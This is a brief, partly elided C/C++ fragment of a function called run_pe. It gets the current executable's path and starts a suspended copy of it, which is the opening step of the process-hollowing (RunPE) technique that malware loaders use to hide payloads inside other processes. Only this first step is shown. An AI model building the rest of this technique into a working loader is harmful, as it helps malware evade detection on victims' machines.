...
inline int run_pe(PVOID img) {
    ...
    GetModuleFileNameA(0, cur_fpath, MAX_PATH);

    if (!CreateProcessA(cur_fpath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }
